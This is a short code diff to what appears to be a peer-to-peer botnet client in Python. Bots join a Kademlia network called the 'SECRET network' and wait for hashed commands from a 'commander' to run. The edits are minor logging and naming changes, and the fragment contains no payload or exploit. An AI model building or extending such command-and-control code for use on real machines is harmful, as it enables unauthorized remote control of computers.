@@ -14,7 +14,7 @@ formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(messag
 handler.setFormatter(formatter)
 log = logging.getLogger('kademlia')
 log.addHandler(handler)
-#log.setLevel(logging.DEBUG) #DEBUG
+log.setLevel(logging.DEBUG) #DEBUG
 
 
 if len(sys.argv) != 4:
@@ -41,10 +41,10 @@ def most_common(list):
 
 #Bot class that holds network, and bot information 
 class botnode:
-    def __init__(self, ip, port, network_id, cmdhash):
+    def __init__(self, ip, port, node_id_long, cmdhash):
         self._ip = ip
         self._port = port
-        self._id = network_id
+        self._id = node_id_long
         self._cmdcnt = 0
         #self._cmdque = asyncio.Queue() #TODO use for querying multiple commands at once.
         # this will store all the child processes that are started
@@ -67,7 +67,7 @@ async def get_cmd(value, sever, bot):
     #The bot needs to check the recived command ID (hashed) from the commander, then sets its value to true and performs the works
     hashcmds = [get_hash(command) for command in bot._cmdsrun.keys()] #Create a list of the hash IDs for commands (ie. SHA1 digest of 'HELLO')
     #print("\nTrying to find {} in {}\n".format(value,hashcmds)) #Debug print statement
-    """ Ideally the commands should not be stored 
+    """ Ideally the commands should not be stored but pulled from another source
     def run_cmd(cmd):
         decrypt(cmd)
         if bot._cmdsrun[cmd] is False:
@@ -239,10 +239,10 @@ try:
     #fi 
     loop_counter=0
     while asyncio.ensure_future(bootstrapDone(server)): #Returns true if server is bootstrapped, otherwise will continue to try and join SECRET network.
-        loop_counter+=1
-        print("Started a new loop numer:\n{}".format(loop_counter))
+        #loop_counter+=1
+        #print("Started a new loop numer:\n{}".format(loop_counter))
         #bot.listVars()
-        loop.run_until_complete(wait_cmd(server, bot)) #If we on the network wait for a command;
+        loop.run_until_complete(wait_cmd(server, bot)) #If we on the network wait for a command; 
         asyncio.sleep(1)
     loop.run_forever()
 except KeyboardInterrupt:
